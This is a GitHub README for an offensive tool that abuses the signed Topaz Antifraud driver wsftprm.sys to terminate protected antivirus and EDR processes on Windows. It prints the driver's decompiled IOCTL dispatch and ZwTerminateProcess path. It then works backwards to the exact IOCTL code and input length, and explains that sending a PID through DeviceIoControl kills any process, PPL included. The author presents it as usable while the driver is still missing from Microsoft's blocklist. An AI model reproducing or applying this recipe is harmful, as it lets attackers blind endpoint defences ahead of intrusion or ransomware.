# TopazTerminator

F, Another driver got burned.. Basically, I was gatekeeping this wsftprm.sys driver for a while ;) been using it for some time now, but since someone posted a public POC https://github.com/xM0kht4r/AV-EDR-Killer , I'm ungatekeeping it. We all know it'll get added to the driver blocklist soon, so here's my implementation for the same — in C


This project exploits the vulnerable `wsftprm.sys` (Topaz Antifraud kernel driver) to terminate protected processes (e.g., antivirus/EDR services) on Windows. 

As of **January 2026**, `wsftprm.sys` (SHA-256: `FF5DBDCF6D7AE5D97B6F3EF412DF0B977BA4A844C45B30CA78C0EEB2653D69A8`) remains one of the signed vulnerable drivers that is **not** on Microsoft's official Vulnerable Driver Blocklist

### RE

There's shit ton of info on how to load & reverse a driver so refer to any of them. The only thing that's interesting about this driver is how they handle the IOCTLs.. The driver does **not** use a standard `switch` statement for IOCTL dispatching. Instead, it employs a chain of subtractions from the IOCTL code to obscure the intended values.

#### Main Dispatch Function (IRP_MJ_DEVICE_CONTROL handler)

```c
__int64 __fastcall DispatchDeviceControl(__int64 a1, __int64 a2, ...)
{
    // ...
    v7 = IoControlCode;  // v6[6] = Parameters.DeviceIoControl.IoControlCode

    v8  = v7 - 0x222000;
    v9  = v8 - 4;
    v10 = v9 - 4;
    v11 = v10 - 16;

    if ( v11 == 4 && InputBufferLength == 1036 )
    {
        // Copy 1036-byte input buffer
        // Extract first DWORD as PID (v41)
        // Call sub_14000264C(v41, buffer) → leads to termination
    }
}
```
#### ZwTerminateProcess() func call
```c
sub_14000264C(unsigned int a1, __int64 a2)
{
    // ...
    v4 = sub_140002848(a1);  // a1 = PID from buffer[0..3]
}

__int64 __fastcall sub_140002848(unsigned int a1)  // PID
{
    CLIENT_ID ClientId = { (HANDLE)a1, 0 };
    OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), 0, 0, 0, 0, 0 };
    HANDLE ProcessHandle;

    ZwOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &ObjAttr, &ClientId);
    if (NT_SUCCESS(status) && ProcessHandle)
    {
        ZwTerminateProcess(ProcessHandle, 0);
        ZwClose(ProcessHandle);
    }
    // ...
}
```
#### Calculating the IOCTL Code (by reversing the Subtractions)
so now we know the prereq to reach vulnfunc. Basically `v11 == 4 && InputBufferLength == 1036` so we can sort of work backwards from the condition to get the IOCTL Code.. 
Something like this: 

```c
v11 == 4
→ v10 - 16 == 4    → v10 = 20 (0x14)
→ v9  - 4  == 20   → v9  = 24 (0x18)
→ v8  - 4  == 24   → v8  = 28 (0x1C)
→ v7  - 0x222000 == 28 → v7 = 0x222000 + 0x1C = 0x22201C
```

And then you can use DeviceIoControl with the IOCTL code to terminate the process you want (including PPL processes)

